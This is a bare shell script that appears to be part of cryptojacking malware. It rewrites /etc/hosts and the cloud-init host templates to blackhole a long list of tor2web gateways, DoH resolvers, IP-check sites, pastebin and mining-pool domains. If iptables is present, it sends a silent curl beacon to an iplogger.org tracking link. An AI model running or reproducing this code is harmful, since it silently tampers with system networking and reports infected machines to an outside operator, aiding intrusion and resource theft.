h=(ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoydd.tor2web.su ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoydd.tor2web.to ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoydd.tor2web.io ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoydd.tor2web.ch ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoydd.tor2web.in nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.tor2web.su dreambusweduybcp.tor2web.su nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.tor2web.to nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.tor2web.io nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.tor2web.ch nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.tor2web.in dreambusweduybcp.tor2web.to dreambusweduybcp.tor2web.io dreambusweduybcp.tor2web.cn dreambusweduybcp.tor2web.in doh.defaultroutes.de dns.hostux.net dns.twnic.tw dns.rubyfish.cn doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz checkip.amazonaws.com ip.sb onion.foundation onion.com.de onion.sh 4tor.ml d2web.org onion.mn onion.in.net onion.to civiclink.network onion.pet onion.glass onion.ws aliyun.one lsd.systemten.org pastebin.com pm.cpuminerpool.com systemten.org relay.tor2socks.in)
f1="/etc/cloud/templates/hosts.redhat.tmpl"
f2="/etc/cloud/templates/hosts.debian.tmpl"
f3="/etc/cloud/templates/hosts.ubuntu.tmpl"
chekhosts() {
        for i in ${h[@]}; do
        sed -i '/'$i'/d' /etc/hosts
        sed -i '1 i\127.0.0.1       '$i'' /etc/hosts
        done
}

chek(){

if [ -f "$f1" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f1
        sed -i '1 i\127.0.0.1       '$i'' $f1
        done
elif [ -f "$f2" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f2
        sed -i '1 i\127.0.0.1       '$i'' $f2
                done
elif [ -f "$f3" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f3
        sed -i '1 i\127.0.0.1       '$i'' $f3
        done
fi
}

chekhosts
chek


d=$(command -v iptables|wc -l)

if [ $d -eq "1" ]; then
        curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
else
        exit
fi
